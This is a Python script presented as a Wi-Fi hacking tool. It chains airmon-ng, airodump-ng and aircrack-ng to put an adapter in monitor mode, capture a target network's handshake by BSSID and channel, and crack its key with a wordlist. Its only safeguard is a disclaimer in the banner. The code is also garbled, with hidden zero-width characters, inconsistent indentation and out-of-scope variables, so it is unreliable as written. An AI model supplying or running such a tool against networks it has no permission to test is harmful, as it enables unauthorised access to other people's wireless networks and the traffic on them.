import os
def banner():
	print("Wi-Fi Hacking Tool AdVanced 2.0\nDeveloped By : YatHarth \nVisit :@yatharthgeek\n\nUse this tool only when you have permissions to hack . \nDeveloper is Not responcible for your illegal activities . \n")

	
def main_menu():
	print("\n[+] Select Options [+]\n[1] Start Scanning \n[2] Check for Updates \n[3] Exit (Safest Option)\n\n")

def start():
	os.system("iwconfig")
	print("\n\n[+] Choose Adapter Name [+]")
	i = 1 
	while i==1:
		adapter = input("\n[>] ")
		if adapter == "":
			print("\nPlease Choose a Name !!")
		else:
			i= i+1
			print("\nName Saved !!")
			monitor ="airmon-ng start "​+adapter 
			scan ="airodump-ng "​+​adapter​+​"mon"
			os.system(monitor)
			os.system(scan)
			target()
			
	

def target():
			j=1
			while j==1:
				print("\nEnter Target BSSID :")
				bssid=input("[>]")
				print("\nEnter Channel No :")
				channel=input("[>]")
				print("Create New Data (FileName) :")
				file=input("[>]")
				if bssid=="" or channel=="" or file=="":
					print("\nNo Empty values accepted")
				else:
					j=j+1
					print("\nSaved Success")
					target=​ ​"airodump-ng -w "​+​file​+​" -c "​+​channel​+​" --bssid "​+​bssid​+​" "​+​adapter​+​"mon"
					os.system(target)
					crack()
					
			
	
def crack():
	k=1
	while k==1:
		
	     filecap = input("Cap File Location :\n[>] ")
	     wordlist​ =​ input​(​"Wordlist location :\n[>] ")
	     
     	
     	if filecap =="" or wordlist =="":
     		print("Data insufficient")
     		
     	else:
     		crack=​ ​"aircrack-ng "​+​file​cap+​" -w "​+​wordlist 
         	os.system(crack)
         	os.system("airmon-ng stop wlan0mon")
     		k=k+1
     	
	
				
banner()
main_menu()

while True :
	bash = int(input ("[$ >] "))
	if bash==1 :
		start()
	



	
